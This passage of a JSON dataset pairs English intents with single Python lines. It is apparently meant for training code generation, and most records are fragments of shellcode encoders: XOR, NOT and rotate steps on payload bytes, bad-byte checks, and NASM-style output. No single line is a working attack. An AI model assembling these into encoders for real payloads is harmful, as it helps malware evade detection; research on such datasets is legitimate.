    "intent_tokens": [
      "check",
      "if",
      "n",
      "is",
      "greater",
      "or",
      "equals",
      "to",
      "0"
    ],
    "snippet_tokens": [
      "if",
      "n",
      ">",
      "=",
      "0",
      ":"
    ]
  },
  {
    "intent": "if matched_a_byte is not True",
    "rewritten_intent": "if matched_a_byte is not True",
    "snippet": "if not matched_a_byte:",
    "slot_map": {
      "True": "var2",
      "matched_a_byte": "var0"
    },
    "intent_tokens": [
      "if",
      "var0",
      "is",
      "not",
      "var2"
    ],
    "snippet_tokens": [
      "if",
      "not",
      "var0",
      ":"
    ]
  },
  {
    "intent": "check if padding does not equal 0",
    "rewritten_intent": "check if padding does not equal 0",
    "snippet": "if padding:",
    "slot_map": {},
    "intent_tokens": [
      "check",
      "if",
      "padding",
      "does",
      "not",
      "equal",
      "0"
    ],
    "snippet_tokens": [
      "if",
      "padding",
      ":"
    ]
  },
  {
    "intent": "check if rotations is less than the value of 1",
    "rewritten_intent": "check if rotations is less than the value of 1",
    "snippet": "if rotations < 1:",
    "slot_map": {
      "than": "var0"
    },
    "intent_tokens": [
      "check",
      "if",
      "rotations",
      "is",
      "less",
      "var0",
      "value",
      "of",
      "1"
    ],
    "snippet_tokens": [
      "if",
      "rotations",
      "<",
      "1",
      ":"
    ]
  },
  {
    "intent": "check if the variable rotations is less than 1",
    "rewritten_intent": "check if the variable rotations is less than 1",
    "snippet": "if rotations < 1:",
    "slot_map": {
      "than": "var0"
    },
    "intent_tokens": [
      "check",
      "if",
      "variable",
      "rotations",
      "is",
      "less",
      "var0",
      "1"
    ],
    "snippet_tokens": [
      "if",
      "rotations",
      "<",
      "1",
      ":"
    ]
  },
  {
    "intent": "check if the bytes object containing the value val1 xor i packed according to the format string unsigned char is equal to bad_byte",
    "rewritten_intent": "check if the bytes object containing the value val1 xor i packed according to the format string unsigned char is equal to bad_byte",
    "snippet": "if struct.pack('B', val1 ^ i) == bad_byte:",
    "slot_map": {
      "bad_byte": "var1",
      "val1": "var0"
    },
    "intent_tokens": [
      "check",
      "if",
      "bytes",
      "object",
      "containing",
      "value",
      "var0",
      "xor",
      "i",
      "packed",
      "according",
      "to",
      "format",
      "string",
      "unsigned",
      "char",
      "is",
      "equal",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "if",
      "struct.pack",
      "(",
      "``",
      "B",
      "''",
      ",",
      "var0",
      "^",
      "i",
      ")",
      "==",
      "var1",
      ":"
    ]
  },
  {
    "intent": "if stub_has_bad_char is True",
    "rewritten_intent": "if stub_has_bad_char is True",
    "snippet": "if stub_has_bad_char:",
    "slot_map": {
      "True": "var2",
      "stub_has_bad_char": "var0"
    },
    "intent_tokens": [
      "if",
      "var0",
      "is",
      "var2"
    ],
    "snippet_tokens": [
      "if",
      "var0",
      ":"
    ]
  },
  {
    "intent": "if total does not equal 2",
    "rewritten_intent": "if total does not equal 2",
    "snippet": "if total != 2:",
    "slot_map": {},
    "intent_tokens": [
      "if",
      "total",
      "does",
      "not",
      "equal",
      "2"
    ],
    "snippet_tokens": [
      "if",
      "total",
      "!",
      "=",
      "2",
      ":"
    ]
  },
  {
    "intent": "if x is less than 128",
    "rewritten_intent": "if x is less than 128",
    "snippet": "if x < 128:",
    "slot_map": {
      "than": "var0"
    },
    "intent_tokens": [
      "if",
      "x",
      "is",
      "less",
      "var0",
      "128"
    ],
    "snippet_tokens": [
      "if",
      "x",
      "<",
      "128",
      ":"
    ]
  },
  {
    "intent": "check if x is less then 128",
    "rewritten_intent": "check if x is less then 128",
    "snippet": "if x < 128:",
    "slot_map": {},
    "intent_tokens": [
      "check",
      "if",
      "x",
      "is",
      "less",
      "then",
      "128"
    ],
    "snippet_tokens": [
      "if",
      "x",
      "<",
      "128",
      ":"
    ]
  },
  {
    "intent": "check if x is equivalent to the element n in shellcode converted into a bytearray",
    "rewritten_intent": "check if x is equivalent to the element n in shellcode converted into a bytearray",
    "snippet": "if x == bytearray(shellcode)[n]:",
    "slot_map": {
      "shellcode": "var0",
      "bytearray": "var1"
    },
    "intent_tokens": [
      "check",
      "if",
      "x",
      "is",
      "equivalent",
      "to",
      "element",
      "n",
      "in",
      "var0",
      "converted",
      "into",
      "var1"
    ],
    "snippet_tokens": [
      "if",
      "x",
      "==",
      "var1",
      "(",
      "var0",
      ")",
      "[",
      "n",
      "]",
      ":"
    ]
  },
  {
    "intent": "if x is greater than 248",
    "rewritten_intent": "if x is greater than 248",
    "snippet": "if x > 248:",
    "slot_map": {
      "than": "var0"
    },
    "intent_tokens": [
      "if",
      "x",
      "is",
      "greater",
      "var0",
      "248"
    ],
    "snippet_tokens": [
      "if",
      "x",
      ">",
      "248",
      ":"
    ]
  },
  {
    "intent": "check if x is greater than 248",
    "rewritten_intent": "check if x is greater than 248",
    "snippet": "if x > 248:",
    "slot_map": {
      "than": "var0"
    },
    "intent_tokens": [
      "check",
      "if",
      "x",
      "is",
      "greater",
      "var0",
      "248"
    ],
    "snippet_tokens": [
      "if",
      "x",
      ">",
      "248",
      ":"
    ]
  },
  {
    "intent": "if xor_byte is equal to 0",
    "rewritten_intent": "if xor_byte is equal to 0",
    "snippet": "if xor_byte == 0:",
    "slot_map": {
      "xor_byte": "var0"
    },
    "intent_tokens": [
      "if",
      "var0",
      "is",
      "equal",
      "to",
      "0"
    ],
    "snippet_tokens": [
      "if",
      "var0",
      "==",
      "0",
      ":"
    ]
  },
  {
    "intent": "import the package binascii",
    "rewritten_intent": "import the package binascii",
    "snippet": "import binascii",
    "slot_map": {
      "binascii": "var0"
    },
    "intent_tokens": [
      "import",
      "package",
      "var0"
    ],
    "snippet_tokens": [
      "import",
      "var0"
    ]
  },
  {
    "intent": "import module random",
    "rewritten_intent": "import module random",
    "snippet": "import random",
    "slot_map": {},
    "intent_tokens": [
      "import",
      "module",
      "random"
    ],
    "snippet_tokens": [
      "import",
      "random"
    ]
  },
  {
    "intent": "import the package random",
    "rewritten_intent": "import the package random",
    "snippet": "import random",
    "slot_map": {},
    "intent_tokens": [
      "import",
      "package",
      "random"
    ],
    "snippet_tokens": [
      "import",
      "random"
    ]
  },
  {
    "intent": "import the package random",
    "rewritten_intent": "import the package random",
    "snippet": "import random;",
    "slot_map": {},
    "intent_tokens": [
      "import",
      "package",
      "random"
    ],
    "snippet_tokens": [
      "import",
      "random"
    ]
  },
  {
    "intent": "import the package socket",
    "rewritten_intent": "import the package socket",
    "snippet": "import socket",
    "slot_map": {},
    "intent_tokens": [
      "import",
      "package",
      "socket"
    ],
    "snippet_tokens": [
      "import",
      "socket"
    ]
  },
  {
    "intent": "import the package struct",
    "rewritten_intent": "import the package struct",
    "snippet": "import struct",
    "slot_map": {
      "struct": "var0"
    },
    "intent_tokens": [
      "import",
      "package",
      "var0"
    ],
    "snippet_tokens": [
      "import",
      "var0"
    ]
  },
  {
    "intent": "import module sys",
    "rewritten_intent": "import module sys",
    "snippet": "import sys",
    "slot_map": {
      "sys": "var0"
    },
    "intent_tokens": [
      "import",
      "module",
      "var0"
    ],
    "snippet_tokens": [
      "import",
      "var0"
    ]
  },
  {
    "intent": "import the package sys",
    "rewritten_intent": "import the package sys",
    "snippet": "import sys",
    "slot_map": {
      "sys": "var0"
    },
    "intent_tokens": [
      "import",
      "package",
      "var0"
    ],
    "snippet_tokens": [
      "import",
      "var0"
    ]
  },
  {
    "intent": "import the sys package",
    "rewritten_intent": "import the sys package",
    "snippet": "import sys",
    "slot_map": {
      "sys": "var0"
    },
    "intent_tokens": [
      "import",
      "var0",
      "package"
    ],
    "snippet_tokens": [
      "import",
      "var0"
    ]
  },
  {
    "intent": "generate a random integer between 1 and 255 then convert the random number into a hexadecimal and store the value in insertByte",
    "rewritten_intent": "generate a random integer between 1 and 255 then convert the random number into a hexadecimal and store the value in insertByte",
    "snippet": "insertByte = hex(random.randint(1,255))",
    "slot_map": {
      "insertByte": "var0"
    },
    "intent_tokens": [
      "generate",
      "random",
      "integer",
      "between",
      "1",
      "and",
      "255",
      "then",
      "convert",
      "random",
      "number",
      "into",
      "hexadecimal",
      "and",
      "store",
      "value",
      "in",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "hex",
      "(",
      "random.randint",
      "(",
      "1",
      ",",
      "255",
      ")",
      ")"
    ]
  },
  {
    "intent": "Store in the variable j the sum of i and magic modulus 256",
    "rewritten_intent": "Store in the variable j the sum of i and magic modulus 256",
    "snippet": "j = (i + magic)%256",
    "slot_map": {},
    "intent_tokens": [
      "Store",
      "in",
      "variable",
      "j",
      "sum",
      "of",
      "i",
      "and",
      "magic",
      "modulus",
      "256"
    ],
    "snippet_tokens": [
      "j",
      "=",
      "(",
      "i",
      "+",
      "magic",
      ")",
      "%",
      "256"
    ]
  },
  {
    "intent": "set leader to the first command-line argument after casting it to an int",
    "rewritten_intent": "set leader to the first command-line argument after casting it to an int",
    "snippet": "leader = int(sys.argv[1])",
    "slot_map": {
      "int": "var0"
    },
    "intent_tokens": [
      "set",
      "leader",
      "to",
      "first",
      "command-line",
      "argument",
      "after",
      "casting",
      "it",
      "to",
      "var0"
    ],
    "snippet_tokens": [
      "leader",
      "=",
      "var0",
      "(",
      "sys.argv",
      "[",
      "1",
      "]",
      ")"
    ]
  },
  {
    "intent": "return the length of array of bytes of the string shellcode",
    "rewritten_intent": "return the length of array of bytes of the string shellcode",
    "snippet": "len(bytearray(shellcode)))",
    "slot_map": {
      "shellcode": "var0"
    },
    "intent_tokens": [
      "return",
      "length",
      "of",
      "array",
      "of",
      "bytes",
      "of",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "len",
      "(",
      "bytearray",
      "(",
      "var0",
      ")",
      ")",
      ")"
    ]
  },
  {
    "intent": "length_format_0x is the count of \",\" in format_0x",
    "rewritten_intent": "length_format_0x is the count of \",\" in format_0x",
    "snippet": "length_format_0x = format_0x.count(',')",
    "slot_map": {
      "\",\"": "var2",
      "format_0x": "var1",
      "length_format_0x": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "count",
      "of",
      "var2",
      "in",
      "var1"
    ],
    "snippet_tokens": [
      "length_var1",
      "=",
      "var1.count",
      "(",
      "'",
      ",",
      "'",
      ")"
    ]
  },
  {
    "intent": "set the variable magic to the value 13",
    "rewritten_intent": "set the variable magic to the value 13",
    "snippet": "magic = 13",
    "slot_map": {},
    "intent_tokens": [
      "set",
      "variable",
      "magic",
      "to",
      "value",
      "13"
    ],
    "snippet_tokens": [
      "magic",
      "=",
      "13"
    ]
  },
  {
    "intent": "call the function mask with the argument width and save the return value in mask_value",
    "rewritten_intent": "call the function mask with the argument width and save the return value in mask_value",
    "snippet": "mask_value = mask(width)",
    "slot_map": {
      "mask_value": "var0"
    },
    "intent_tokens": [
      "call",
      "function",
      "mask",
      "with",
      "argument",
      "width",
      "and",
      "save",
      "return",
      "value",
      "in",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "mask",
      "(",
      "width",
      ")"
    ]
  },
  {
    "intent": "matched_a_byte is initialized to False",
    "rewritten_intent": "matched_a_byte is initialized to False",
    "snippet": "matched_a_byte = False",
    "slot_map": {
      "False": "var1",
      "matched_a_byte": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "initialized",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "matched_a_byte is True",
    "rewritten_intent": "matched_a_byte is True",
    "snippet": "matched_a_byte = True",
    "slot_map": {
      "True": "var1",
      "matched_a_byte": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "max_bits is an integer 8",
    "rewritten_intent": "max_bits is an integer 8",
    "snippet": "max_bits = 8",
    "slot_map": {
      "max_bits": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "integer",
      "8"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "8"
    ]
  },
  {
    "intent": "store in the variable n the result of the bitwise and operation between n and the function mask with the parameter width",
    "rewritten_intent": "store in the variable n the result of the bitwise and operation between n and the function mask with the parameter width",
    "snippet": "n &= mask(width)",
    "slot_map": {
      "bitwise": "var0"
    },
    "intent_tokens": [
      "store",
      "in",
      "variable",
      "n",
      "result",
      "of",
      "var0",
      "and",
      "operation",
      "between",
      "n",
      "and",
      "function",
      "mask",
      "with",
      "parameter",
      "width"
    ],
    "snippet_tokens": [
      "n",
      "&",
      "=",
      "mask",
      "(",
      "width",
      ")"
    ]
  },
  {
    "intent": "increment the variable n by 1",
    "rewritten_intent": "increment the variable n by 1",
    "snippet": "n += 1",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "variable",
      "n",
      "by",
      "1"
    ],
    "snippet_tokens": [
      "n",
      "+=",
      "1"
    ]
  },
  {
    "intent": "set the variable n to the value 1",
    "rewritten_intent": "set the variable n to the value 1",
    "snippet": "n = 1",
    "slot_map": {},
    "intent_tokens": [
      "set",
      "variable",
      "n",
      "to",
      "value",
      "1"
    ],
    "snippet_tokens": [
      "n",
      "=",
      "1"
    ]
  },
  {
    "intent": "convert shellcode to a bytearray and store its length in the variable n",
    "rewritten_intent": "convert shellcode to a bytearray and store its length in the variable n",
    "snippet": "n = len(bytearray(shellcode))",
    "slot_map": {
      "shellcode": "var0",
      "bytearray": "var1"
    },
    "intent_tokens": [
      "convert",
      "var0",
      "to",
      "var1",
      "and",
      "store",
      "its",
      "length",
      "in",
      "variable",
      "n"
    ],
    "snippet_tokens": [
      "n",
      "=",
      "len",
      "(",
      "var1",
      "(",
      "var0",
      ")",
      ")"
    ]
  },
  {
    "intent": "substitute elements of nasm from the index 1 to end for nasm",
    "rewritten_intent": "substitute elements of nasm from the index 1 to end for nasm",
    "snippet": "nasm = nasm[1:]",
    "slot_map": {
      "nasm": "var0"
    },
    "intent_tokens": [
      "substitute",
      "elements",
      "of",
      "var0",
      "from",
      "index",
      "1",
      "to",
      "end",
      "for",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var0",
      "[",
      "1",
      ":",
      "]"
    ]
  },
  {
    "intent": "convert encoded to string and replace all occurrences of \"\\\\x\" with \",0x\" in it",
    "rewritten_intent": "convert encoded to string and replace all occurrences of \"\\\\x\" with \",0x\" in it",
    "snippet": "nasm = str(encoded).replace(\"\\\\x\", \",0x\")",
    "slot_map": {
      "\"\\\\x\"": "var0",
      "\",0x\"": "var1",
      "0x": "var2"
    },
    "intent_tokens": [
      "convert",
      "encoded",
      "to",
      "string",
      "and",
      "replace",
      "all",
      "occurrences",
      "of",
      "var0",
      "with",
      "var1",
      "in",
      "it"
    ],
    "snippet_tokens": [
      "nasm",
      "=",
      "str",
      "(",
      "encoded",
      ")",
      ".replace",
      "(",
      "``",
      "\\\\x",
      "''",
      ",",
      "var1",
      ")"
    ]
  },
  {
    "intent": "nbits is the second element of sys.argv converted to integer",
    "rewritten_intent": "nbits is the second element of sys.argv converted to integer",
    "snippet": "nbits = int(sys.argv[2])",
    "slot_map": {
      "nbits": "var0",
      "sys.argv": "var1"
    },
    "intent_tokens": [
      "var0",
      "is",
      "second",
      "element",
      "of",
      "var1",
      "converted",
      "to",
      "integer"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "int",
      "(",
      "sys.argv",
      "[",
      "2",
      "]",
      ")"
    ]
  },
  {
    "intent": "new is not i and 0xff",
    "rewritten_intent": "new is not i and 0xff",
    "snippet": "new = ~i & 0xff",
    "slot_map": {},
    "intent_tokens": [
      "new",
      "is",
      "not",
      "i",
      "and",
      "0xff"
    ],
    "snippet_tokens": [
      "new",
      "=",
      "~i",
      "&",
      "255"
    ]
  },
  {
    "intent": "new is new xor xor",
    "rewritten_intent": "new is new xor xor",
    "snippet": "new = new ^ xor",
    "slot_map": {},
    "intent_tokens": [
      "new",
      "is",
      "new",
      "xor",
      "xor"
    ],
    "snippet_tokens": [
      "new",
      "=",
      "new",
      "^",
      "xor"
    ]
  },
  {
    "intent": "new is new shifted left by shift",
    "rewritten_intent": "new is new shifted left by shift",
    "snippet": "new = new << shift",
    "slot_map": {},
    "intent_tokens": [
      "new",
      "is",
      "new",
      "shifted",
      "left",
      "by",
      "shift"
    ],
    "snippet_tokens": [
      "new",
      "=",
      "new",
      "<",
      "<",
      "shift"
    ]
  },
  {
    "intent": "offset is an integer 1",
    "rewritten_intent": "offset is an integer 1",
    "snippet": "offset = 1",
    "slot_map": {},
    "intent_tokens": [
      "offset",
      "is",
      "integer",
      "1"
    ],
    "snippet_tokens": [
      "offset",
      "=",
      "1"
    ]
  },
  {
    "intent": "orig is an empty list",
    "rewritten_intent": "orig is an empty list",
    "snippet": "orig = []",
    "slot_map": {
      "orig": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "empty",
      "list"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "[",
      "]"
    ]
  },
  {
    "intent": "append i to orig",
    "rewritten_intent": "append i to orig",
    "snippet": "orig.append(i)",
    "slot_map": {
      "orig": "var0"
    },
    "intent_tokens": [
      "append",
      "i",
      "to",
      "var0"
    ],
    "snippet_tokens": [
      "var0.append",
      "(",
      "i",
      ")"
    ]
  },
  {
    "intent": "convert the value x in hexadecimal and append it to the string original_shellcode followed by ','",
    "rewritten_intent": "convert the value x in hexadecimal and append it to the string original_shellcode followed by ','",
    "snippet": "original_shellcode += '%02x, ' %x",
    "slot_map": {
      "','": "var2",
      "original_shellcode": "var0"
    },
    "intent_tokens": [
      "convert",
      "value",
      "x",
      "in",
      "hexadecimal",
      "and",
      "append",
      "it",
      "to",
      "string",
      "var0",
      "followed",
      "by",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "x"
    ]
  },
  {
    "intent": "append string '0x' to original_shellcode",
    "rewritten_intent": "append string '0x' to original_shellcode",
    "snippet": "original_shellcode += '0x'",
    "slot_map": {
      "'0x'": "var0",
      "original_shellcode": "var1"
    },
    "intent_tokens": [
      "append",
      "string",
      "var0",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "original_shellcode is a string \"\"",
    "rewritten_intent": "original_shellcode is a string \"\"",
    "snippet": "original_shellcode = \"\"",
    "slot_map": {
      "\"\"": "var1",
      "original_shellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "P is a string '\\033[35m'",
    "rewritten_intent": "P is a string '\\033[35m'",
    "snippet": "P = '\\033[35m'",
    "slot_map": {
      "'\\033[35m'": "var0"
    },
    "intent_tokens": [
      "P",
      "is",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "set the variable padding equal to 0",
    "rewritten_intent": "set the variable padding equal to 0",
    "snippet": "padding = 0",
    "slot_map": {},
    "intent_tokens": [
      "set",
      "variable",
      "padding",
      "equal",
      "to",
      "0"
    ],
    "snippet_tokens": [
      "padding",
      "=",
      "0"
    ]
  },
  {
    "intent": "set the variable padding equal to 4 minus the length of shellcode_original modulus 4",
    "rewritten_intent": "set the variable padding equal to 4 minus the length of shellcode_original modulus 4",
    "snippet": "padding = 4 - (len(shellcode_original) % 4)",
    "slot_map": {
      "shellcode_original": "var0"
    },
    "intent_tokens": [
      "set",
      "variable",
      "padding",
      "equal",
      "to",
      "4",
      "minus",
      "length",
      "of",
      "var0",
      "modulus",
      "4"
    ],
    "snippet_tokens": [
      "padding",
      "=",
      "4",
      "-",
      "len",
      "(",
      "var0",
      ")",
      "%",
      "4"
    ]
  },
  {
    "intent": "set the variable r to a random integer between 1 and 255",
    "rewritten_intent": "set the variable r to a random integer between 1 and 255",
    "snippet": "r = random.randint(1,255)",
    "slot_map": {},
    "intent_tokens": [
      "set",
      "variable",
      "r",
      "to",
      "random",
      "integer",
      "between",
      "1",
      "and",
      "255"
    ],
    "snippet_tokens": [
      "r",
      "=",
      "random.randint",
      "(",
      "1",
      ",",
      "255",
      ")"
    ]
  },
  {
    "intent": "generate a random integer between 1 and 8 and store it in a variable called rand",
    "rewritten_intent": "generate a random integer between 1 and 8 and store it in a variable called rand",
    "snippet": "rand = random.randint(1,8)",
    "slot_map": {},
    "intent_tokens": [
      "generate",
      "random",
      "integer",
      "between",
      "1",
      "and",
      "8",
      "and",
      "store",
      "it",
      "in",
      "variable",
      "called",
      "rand"
    ],
    "snippet_tokens": [
      "rand",
      "=",
      "random.randint",
      "(",
      "1",
      ",",
      "8",
      ")"
    ]
  },
  {
    "intent": "initialize a random number generator",
    "rewritten_intent": "initialize a random number generator",
    "snippet": "random.seed()",
    "slot_map": {},
    "intent_tokens": [
      "initialize",
      "random",
      "number",
      "generator"
    ],
    "snippet_tokens": [
      "random.seed",
      "(",
      ")"
    ]
  },
  {
    "intent": "right shift by val2 the and operation between x and val1 and assign it to res1",
    "rewritten_intent": "right shift by val2 the and operation between x and val1 and assign it to res1",
    "snippet": "res1 = ((x & val1) >> val2)",
    "slot_map": {
      "val2": "var0",
      "val1": "var1",
      "res1": "var2"
    },
    "intent_tokens": [
      "right",
      "shift",
      "by",
      "var0",
      "and",
      "operation",
      "between",
      "x",
      "and",
      "var1",
      "and",
      "assign",
      "it",
      "to",
      "var2"
    ],
    "snippet_tokens": [
      "var2",
      "=",
      "(",
      "x",
      "&",
      "var1",
      ")",
      ">",
      ">",
      "var0"
    ]
  },
  {
    "intent": "perform the and operation between x shifted left by val2 and val1 and assign the result to res1",
    "rewritten_intent": "perform the and operation between x shifted left by val2 and val1 and assign the result to res1",
    "snippet": "res1 = (x << val2) & (val1)",
    "slot_map": {
      "val2": "var0",
      "val1": "var1",
      "res1": "var2"
    },
    "intent_tokens": [
      "perform",
      "and",
      "operation",
      "between",
      "x",
      "shifted",
      "left",
      "by",
      "var0",
      "and",
      "var1",
      "and",
      "assign",
      "result",
      "to",
      "var2"
    ],
    "snippet_tokens": [
      "var2",
      "=",
      "x",
      "<",
      "<",
      "var0",
      "&",
      "var1"
    ]
  },
  {
    "intent": "res2 is the result of the and operation between x and val1",
    "rewritten_intent": "res2 is the result of the and operation between x and val1",
    "snippet": "res2 = (x & val1)",
    "slot_map": {
      "res2": "var0",
      "val1": "var1"
    },
    "intent_tokens": [
      "var0",
      "is",
      "result",
      "of",
      "and",
      "operation",
      "between",
      "x",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "x",
      "&",
      "var1"
    ]
  },
  {
    "intent": "res2 is the result of the and operation between res2 and val1",
    "rewritten_intent": "res2 is the result of the and operation between res2 and val1",
    "snippet": "res2 = res2 & val1",
    "slot_map": {
      "res2": "var0",
      "val1": "var2"
    },
    "intent_tokens": [
      "var0",
      "is",
      "result",
      "of",
      "and",
      "operation",
      "between",
      "var0",
      "and",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var0",
      "&",
      "var2"
    ]
  },
  {
    "intent": "right shift res2 by max_bits minus val2",
    "rewritten_intent": "right shift res2 by max_bits minus val2",
    "snippet": "res2 = res2 >> (max_bits-val2)",
    "slot_map": {
      "max_bits": "var1",
      "res2": "var0",
      "val2": "var2"
    },
    "intent_tokens": [
      "right",
      "shift",
      "var0",
      "by",
      "var1",
      "minus",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var0",
      ">",
      ">",
      "var1",
      "-",
      "var2"
    ]
  },
  {
    "intent": "left shift x by max_bits minus val2 and assign the result to res2",
    "rewritten_intent": "left shift x by max_bits minus val2 and assign the result to res2",
    "snippet": "res2 = x << (max_bits - val2)",
    "slot_map": {
      "max_bits": "var0",
      "val2": "var1",
      "res2": "var2"
    },
    "intent_tokens": [
      "left",
      "shift",
      "x",
      "by",
      "var0",
      "minus",
      "var1",
      "and",
      "assign",
      "result",
      "to",
      "var2"
    ],
    "snippet_tokens": [
      "var2",
      "=",
      "x",
      "<",
      "<",
      "var0",
      "-",
      "var1"
    ]
  },
  {
    "intent": "return the result of bitwise left shift of n by rotations bitwise and with mask_value bitwise or n  bitwise right shift by the subtraction of rotations from width",
    "rewritten_intent": "return the result of bitwise left shift of n by rotations bitwise and with mask_value bitwise or n  bitwise right shift by the subtraction of rotations from width",
    "snippet": "return ((n << rotations) & mask_value) | (n >> (width - rotations))",
    "slot_map": {
      "mask_value": "var5",
      "bitwise": "var1",
      " ": "var0"
    },
    "intent_tokens": [
      "return",
      "result",
      "of",
      "var1",
      "left",
      "shift",
      "of",
      "n",
      "by",
      "rotations",
      "var1",
      "and",
      "with",
      "var5",
      "var1",
      "or",
      "n",
      "var1",
      "right",
      "shift",
      "by",
      "subtraction",
      "of",
      "rotations",
      "from",
      "width"
    ],
    "snippet_tokens": [
      "return",
      "n",
      "<",
      "<",
      "rotations",
      "&",
      "var5",
      "|",
      "n",
      ">",
      ">",
      "width",
      "-",
      "rotations"
    ]
  },
  {
    "intent": "return the result of n bitwise right shift with rotations or n bitwise left shift by width minus rotations and the bitwise and operation with mask_value",
    "rewritten_intent": "return the result of n bitwise right shift with rotations or n bitwise left shift by width minus rotations and the bitwise and operation with mask_value",
    "snippet": "return (n >> rotations) | ((n << (width - rotations)) & mask_value)",
    "slot_map": {
      "mask_value": "var3",
      "bitwise": "var0"
    },
    "intent_tokens": [
      "return",
      "result",
      "of",
      "n",
      "var0",
      "right",
      "shift",
      "with",
      "rotations",
      "or",
      "n",
      "var0",
      "left",
      "shift",
      "by",
      "width",
      "minus",
      "rotations",
      "and",
      "var0",
      "and",
      "operation",
      "with",
      "var3"
    ],
    "snippet_tokens": [
      "return",
      "n",
      ">",
      ">",
      "rotations",
      "|",
      "n",
      "<",
      "<",
      "width",
      "-",
      "rotations",
      "&",
      "var3"
    ]
  },
  {
    "intent": "return the value of 0",
    "rewritten_intent": "return the value of 0",
    "snippet": "return 0",
    "slot_map": {},
    "intent_tokens": [
      "return",
      "value",
      "of",
      "0"
    ],
    "snippet_tokens": [
      "return",
      "0"
    ]
  },
  {
    "intent": "return 2 to the power of n and subtract 1",
    "rewritten_intent": "return 2 to the power of n and subtract 1",
    "snippet": "return 2**n - 1",
    "slot_map": {},
    "intent_tokens": [
      "return",
      "2",
      "to",
      "power",
      "of",
      "n",
      "and",
      "subtract",
      "1"
    ],
    "snippet_tokens": [
      "return",
      "2",
      "*",
      "*",
      "n",
      "-",
      "1"
    ]
  },
  {
    "intent": "return i",
    "rewritten_intent": "return i",
    "snippet": "return i",
    "slot_map": {},
    "intent_tokens": [
      "return",
      "i"
    ],
    "snippet_tokens": [
      "return",
      "i"
    ]
  },
  {
    "intent": "return the value of n",
    "rewritten_intent": "return the value of n",
    "snippet": "return n",
    "slot_map": {},
    "intent_tokens": [
      "return",
      "value",
      "of",
      "n"
    ],
    "snippet_tokens": [
      "return",
      "n"
    ]
  },
  {
    "intent": "return the value n",
    "rewritten_intent": "return the value n",
    "snippet": "return n",
    "slot_map": {},
    "intent_tokens": [
      "return",
      "value",
      "n"
    ],
    "snippet_tokens": [
      "return",
      "n"
    ]
  },
  {
    "intent": "get the hexadecimal value of suplX and reverse its order then store the value in rev_suplx",
    "rewritten_intent": "get the hexadecimal value of suplX and reverse its order then store the value in rev_suplx",
    "snippet": "rev_suplx = hex(suplX)[::-1]",
    "slot_map": {
      "rev_suplx": "var1",
      "suplX": "var0"
    },
    "intent_tokens": [
      "get",
      "hexadecimal",
      "value",
      "of",
      "var0",
      "and",
      "reverse",
      "its",
      "order",
      "then",
      "store",
      "value",
      "in",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "=",
      "hex",
      "(",
      "var0",
      ")",
      "[",
      ":",
      ":-1",
      "]"
    ]
  },
  {
    "intent": "rot is an integer 8",
    "rewritten_intent": "rot is an integer 8",
    "snippet": "rot = 8",
    "slot_map": {},
    "intent_tokens": [
      "rot",
      "is",
      "integer",
      "8"
    ],
    "snippet_tokens": [
      "rot",
      "=",
      "8"
    ]
  },
  {
    "intent": "ROT is the first element of sys.argv converted to integer",
    "rewritten_intent": "ROT is the first element of sys.argv converted to integer",
    "snippet": "ROT = int(sys.argv[1])",
    "slot_map": {
      "sys.argv": "var0"
    },
    "intent_tokens": [
      "ROT",
      "is",
      "first",
      "element",
      "of",
      "var0",
      "converted",
      "to",
      "integer"
    ],
    "snippet_tokens": [
      "ROT",
      "=",
      "int",
      "(",
      "sys.argv",
      "[",
      "1",
      "]",
      ")"
    ]
  },
  {
    "intent": "store in the variable rotations the modulus of rotations and width",
    "rewritten_intent": "store in the variable rotations the modulus of rotations and width",
    "snippet": "rotations %= width",
    "slot_map": {},
    "intent_tokens": [
      "store",
      "in",
      "variable",
      "rotations",
      "modulus",
      "of",
      "rotations",
      "and",
      "width"
    ],
    "snippet_tokens": [
      "rotations",
      "%",
      "=",
      "width"
    ]
  },
  {
    "intent": "rox_encoded_instruction is the result of the or operation between res1 and res2",
    "rewritten_intent": "rox_encoded_instruction is the result of the or operation between res1 and res2",
    "snippet": "rox_encoded_instruction = res1 | res2",
    "slot_map": {
      "rox_encoded_instruction": "var0",
      "res1": "var1",
      "res2": "var2"
    },
    "intent_tokens": [
      "var0",
      "is",
      "result",
      "of",
      "or",
      "operation",
      "between",
      "var1",
      "and",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1",
      "|",
      "var2"
    ]
  },
  {
    "intent": "Convert the value of leader to hexadecimal, then slice it at index 3, convert it to an int16 and set its value to the variable sb",
    "rewritten_intent": "Convert the value of leader to hexadecimal, then slice it at index 3, convert it to an int16 and set its value to the variable sb",
    "snippet": "sb = int(hex(leader)[3:],16)",
    "slot_map": {
      "int16": "var0"
    },
    "intent_tokens": [
      "Convert",
